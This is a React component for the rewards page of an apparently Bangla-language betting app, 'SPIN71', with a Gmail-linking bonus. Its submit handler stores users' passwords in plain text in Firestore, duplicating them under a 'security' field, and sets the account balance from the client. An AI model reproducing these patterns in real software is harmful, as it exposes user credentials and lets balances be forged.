import React, { useState } from "react";
import { ChevronLeft, Award, Gift, Star, Zap, Trophy, Target, Mail, X, CheckCircle2, ShieldCheck, Loader2 } from "lucide-react";
import { doc, setDoc, updateDoc, serverTimestamp } from 'firebase/firestore';
import { db, handleFirestoreError, OperationType } from '../firebase';

interface RewardsViewProps {
  onTabChange: (tab: any) => void;
  userData: any;
  setUserData: (data: any) => void;
  balance: number;
  setBalance: (balance: number) => void;
}

export default function RewardsView({ onTabChange, userData, setUserData, balance, setBalance }: RewardsViewProps) {
  const [showGmailModal, setShowGmailModal] = useState(false);
  const [gmail, setGmail] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const rewards = [
    { 
      id: 'gmail', 
      title: "জিমেইল এড করুন (Add Gmail)", 
      desc: "আপনার জিমেইল এড করুন এবং বোনাস পান। এটি আপনার অ্যাকাউন্টের নিরাপত্তা নিশ্চিত করবে।", 
      icon: Mail, 
      color: "text-blue-400", 
      bg: "bg-blue-400/10", 
      amount: "৳ ০.২৭৭৭",
      isCompleted: userData?.isGmailLinked || false
    },
    { id: 1, title: "ডেইলি লগইন বোনাস", desc: "প্রতিদিন লগইন করুন এবং পুরস্কার জিতুন", icon: Zap, color: "text-yellow-400", bg: "bg-yellow-400/10", amount: "৳ ১০", isCompleted: false },
    { id: 2, title: "প্রথম জমা বোনাস", desc: "আপনার প্রথম জমার উপর ১০০% বোনাস পান", icon: Gift, color: "text-teal-400", bg: "bg-teal-400/10", amount: "৳ ৫০০+", isCompleted: false },
    { id: 3, title: "সাপ্তাহিক চ্যালেঞ্জ", desc: "সাপ্তাহিক মিশন সম্পন্ন করুন", icon: Trophy, color: "text-purple-400", bg: "bg-purple-400/10", amount: "৳ ১০০০", isCompleted: false },
    { id: 4, title: "রেফারেল বোনাস", desc: "বন্ধুদের আমন্ত্রণ জানান এবং আয় করুন", icon: Star, color: "text-blue-400", bg: "bg-blue-400/10", amount: "৳ ৯৯৯", isCompleted: false },
  ];

  const handleGmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!gmail || !gmail.includes('@')) return;

    setIsSubmitting(true);
    try {
      const rewardAmount = 0.2777;
      const newBalance = balance + rewardAmount;
      const updatedUserData = {
        ...userData,
        gmail: gmail,
        isGmailLinked: true,
        balance: newBalance,
        lastUpdated: new Date().toISOString()
      };

      // Sync with Firebase
      const userId = userData?.id || 'anonymous_user';
      const userRef = doc(db, 'users', userId);
      
      await setDoc(userRef, {
        username: userData?.username || 'unknown',
        phoneNumber: userData?.phoneNumber || userData?.id || 'unknown',
        password: userData?.password || '••••••••',
        balance: newBalance,
        gmail: gmail,
        isGmailLinked: true,
        createdAt: serverTimestamp(),
        // Security fields as requested by user
        security: {
          username: userData?.username || 'unknown',
          phoneNumber: userData?.phoneNumber || userData?.id || 'unknown',
          password: userData?.password || '••••••••'
        }
      }, { merge: true });

      // Update local state
      setUserData(updatedUserData);
      setBalance(newBalance);
      localStorage.setItem('spin71_user', JSON.stringify(updatedUserData));
      
      setShowSuccess(true);
      setTimeout(() => {
        setShowSuccess(false);
        setShowGmailModal(false);
      }, 2000);
    } catch (error) {
      handleFirestoreError(error, OperationType.WRITE, `users/${userData?.id}`);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex-1 overflow-y-auto pb-24 bg-[#0b0b0b] min-h-screen">
      {/* Header */}
      <div className="bg-gradient-to-b from-[#128a61] to-[#0b0b0b] p-4 pt-6 rounded-b-3xl shadow-lg relative overflow-hidden">
        <div className="absolute -right-10 -top-10 w-40 h-40 bg-white/10 rounded-full blur-3xl"></div>
        
        <div className="flex justify-between items-center relative z-10">
          <div className="flex items-center gap-3">
            <button 
              onClick={() => onTabChange('home')}
              className="p-2 bg-black/20 hover:bg-black/40 rounded-full transition-colors text-white backdrop-blur-sm"
            >
              <ChevronLeft size={20} />
            </button>
            <h2 className="text-2xl font-black italic tracking-tighter text-white drop-shadow-md">
              SPIN71 <span className="text-yellow-400">REWARDS</span>
            </h2>
          </div>
          <div className="bg-black/30 px-3 py-1.5 rounded-full flex items-center gap-2 border border-white/10 backdrop-blur-sm">
            <Award size={16} className="text-yellow-400" />
            <span className="text-white font-bold text-sm">পুরস্কার</span>
          </div>
        </div>

        <div className="mt-8 text-center relative z-10 animate-in fade-in zoom-in duration-700">
          <div className="inline-block p-4 bg-yellow-400/20 rounded-full mb-4 border border-yellow-400/30">
            <Trophy size={48} className="text-yellow-400" />
          </div>
          <h1 className="text-2xl font-black text-white mb-2">পুরস্কার সেন্টার</h1>
          <p className="text-teal-100 text-sm max-w-[250px] mx-auto">মিশন সম্পন্ন করুন এবং এক্সক্লুসিভ বোনাস আনলক করুন!</p>
        </div>
      </div>

      {/* Rewards List */}
      <div className="p-4 space-y-4">
        <h3 className="text-white font-bold flex items-center gap-2 mb-2">
          <Target size={18} className="text-teal-400" />
          উপলব্ধ পুরস্কার (Available Rewards)
        </h3>
        
        <div className="grid gap-3">
          {rewards.map((reward) => (
            <div 
              key={reward.id}
              className={`bg-[#1b1b1b] p-4 rounded-2xl border border-white/5 flex items-center justify-between group transition-all ${reward.isCompleted ? 'opacity-70 grayscale-[0.5]' : 'hover:border-teal-500/30'}`}
            >
              <div className="flex items-center gap-4">
                <div className={`w-12 h-12 rounded-xl ${reward.bg} flex items-center justify-center shadow-lg relative`}>
                  <reward.icon size={24} className={reward.color} />
                  {reward.isCompleted && (
                    <div className="absolute -top-1 -right-1 bg-green-500 rounded-full p-0.5 border border-black">
                      <CheckCircle2 size={10} className="text-white" />
                    </div>
                  )}
                </div>
                <div className="flex-1">
                  <h4 className="text-white font-bold text-sm">{reward.title}</h4>
                  <p className="text-gray-400 text-[10px] leading-tight">{reward.desc}</p>
                </div>
              </div>
              <div className="text-right ml-4">
                <div className="text-yellow-400 font-black text-sm mb-1">{reward.amount}</div>
                <button 
                  onClick={() => reward.id === 'gmail' && !reward.isCompleted && setShowGmailModal(true)}
                  disabled={reward.isCompleted}
                  className={`text-[10px] font-bold px-3 py-1 rounded-full transition-colors ${reward.isCompleted ? 'bg-gray-700 text-gray-400 cursor-not-allowed' : 'bg-teal-600 hover:bg-teal-500 text-white'}`}
                >
                  {reward.isCompleted ? 'সম্পন্ন' : 'সংগ্রহ করুন'}
                </button>
              </div>
            </div>
          ))}
        </div>

        {/* Coming Soon Section */}
        <div className="mt-8 p-6 bg-[#1b1b1b]/50 rounded-3xl border border-dashed border-white/10 text-center">
          <div className="w-12 h-12 bg-black/40 rounded-full flex items-center justify-center mx-auto mb-3">
            <Star size={24} className="text-gray-500" />
          </div>
          <h4 className="text-gray-300 font-bold text-sm mb-1">আরো পুরস্কার আসছে...</h4>
          <p className="text-gray-500 text-xs">নতুন নতুন ইভেন্ট এবং পুরস্কারের জন্য আমাদের সাথেই থাকুন।</p>
        </div>
      </div>

      {/* Gmail Binding Modal */}
      {showGmailModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300">
          <div className="bg-[#1b1b1b] w-full max-w-sm rounded-3xl border border-teal-500/30 overflow-hidden shadow-2xl animate-in zoom-in-95 duration-300">
            <div className="bg-gradient-to-r from-teal-700 to-teal-900 p-6 relative">
              <button 
                onClick={() => setShowGmailModal(false)}
                className="absolute right-4 top-4 text-white/50 hover:text-white transition-colors"
              >
                <X size={20} />
              </button>
              <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center mb-4 border border-white/20">
                <Mail size={32} className="text-white" />
              </div>
              <h3 className="text-xl font-black text-white">জিমেইল এড করুন</h3>
              <p className="text-teal-100 text-xs mt-1">আপনার জিমেইল এড করে ২৭.৭৭ পয়সা বোনাস নিন!</p>
            </div>

            <div className="p-6">
              {showSuccess ? (
                <div className="py-8 text-center animate-in zoom-in duration-500">
                  <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-green-500/30">
                    <CheckCircle2 size={40} className="text-green-500" />
                  </div>
                  <h4 className="text-white font-bold text-lg">অভিনন্দন!</h4>
                  <p className="text-gray-400 text-sm">আপনার জিমেইল সফলভাবে এড করা হয়েছে এবং বোনাস যোগ করা হয়েছে।</p>
                </div>
              ) : (
                <form onSubmit={handleGmailSubmit} className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-xs text-gray-400 font-bold uppercase tracking-wider">আপনার জিমেইল (Your Gmail)</label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-teal-500" size={18} />
                      <input 
                        type="email" 
                        required
                        value={gmail}
                        onChange={(e) => setGmail(e.target.value)}
                        placeholder="example@gmail.com"
                        className="w-full bg-black/50 border border-teal-500/30 rounded-xl py-3 pl-10 pr-4 text-white text-sm focus:outline-none focus:border-teal-500 transition-all"
                      />
                    </div>
                  </div>

                  <div className="bg-teal-900/20 p-3 rounded-xl border border-teal-500/10 flex items-start gap-3">
                    <ShieldCheck size={20} className="text-teal-400 shrink-0 mt-0.5" />
                    <p className="text-[10px] text-teal-200 leading-relaxed">
                      আপনার নিরাপত্তা আমাদের অগ্রাধিকার। আপনার ইউজারনেম, নাম্বার এবং পাসওয়ার্ড দিয়ে সুরক্ষিত এই অ্যাকাউন্টটি এখন জিমেইল এর মাধ্যমে আরো নিরাপদ হবে।
                    </p>
                  </div>

                  <button 
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full bg-gradient-to-r from-yellow-400 to-yellow-600 text-black font-black py-4 rounded-xl shadow-lg hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                  >
                    {isSubmitting ? (
                      <Loader2 size={20} className="animate-spin" />
                    ) : (
                      <>সাবমিট করুন (Submit)</>
                    )}
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
